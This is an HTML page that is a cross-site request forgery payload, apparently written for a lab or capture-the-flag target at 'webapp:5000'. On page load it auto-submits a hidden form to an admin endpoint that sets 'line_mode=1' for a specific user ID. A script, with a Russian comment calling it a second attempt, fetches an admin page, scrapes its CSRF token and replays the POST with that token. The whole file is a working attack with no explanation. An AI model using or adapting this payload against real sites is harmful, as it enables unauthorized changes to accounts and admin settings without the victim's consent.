<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <form action="http://webapp:5000/admin/line-mode/user/2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3" method="POST">
        <input type="hidden" name="line_mode" value="1">
        </form>

    <script>
        // Попытка №2: Загружаем страницу админа в фоне и вытаскиваем токен из HTML
        fetch('http://webapp:5000/admin/pending')
            .then(response => response.text())
            .then(html => {
                const doc = new DOMParser().parseFromString(html, 'text/html');
                const token = doc.querySelector('input[name="csrf_token"]').value;
                
                fetch('http://webapp:5000/admin/line-mode/user/2b3549aa-5e6a-47ef-8f24-a82a5cfe29b3', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'line_mode=1&csrf_token=' + token
                });
            });
    </script>
</body>
</html>
